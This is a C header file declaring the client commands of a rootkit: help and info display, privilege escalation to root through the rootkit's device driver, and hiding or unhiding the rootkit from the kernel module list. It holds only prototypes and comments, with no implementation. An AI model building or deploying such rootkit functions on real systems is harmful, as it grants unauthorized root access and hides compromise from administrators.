/**
 * @file commands.h
 * 
 * @brief Definitions for client commands
 * 
 * This file contains the definitions for the client commands.
 */

#ifndef _C_COMMANDS_H
#define _C_COMMANDS_H

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

/**
 * @brief Display the help menu
 *
 * This function displays the help menu for the client.
 *
 * @param filename The name of the client executable
 *
 * @return 0 on success, -1 on failure
 */
int display_help(char * filename);

/**
 * @brief Display information about the rootkit
 *
 * This function displays information about the rootkit.
 *
 * @return 0 on success, -1 on failure
 */
int show_info();

/**
 * @brief Escalate privileges to root
 *
 * This function escalates the privileges of the current user to root.
 *
 * @param driver The path to the rootkit device driver
 *
 * @return 0 on success, -1 on failure
 */
int privesc(char *driver);

/**
 * @brief Hide the rootkit from the kernel module list
 *
 * This function hides the rootkit from the kernel module list.
 *
 * @param driver The path to the rootkit device driver
 *
 * @return 0 on success, -1 on failure
 */
int hide(char *driver);

/**
 * @brief Unhide the rootkit from the kernel module list
 *
 * This function reveals the rootkit in the kernel module list.
 *
 * @param driver The path to the rootkit device driver
 *
 * @return 0 on success, -1 on failure
 */
int unhide(char *driver);

#endif // _C_COMMANDS_H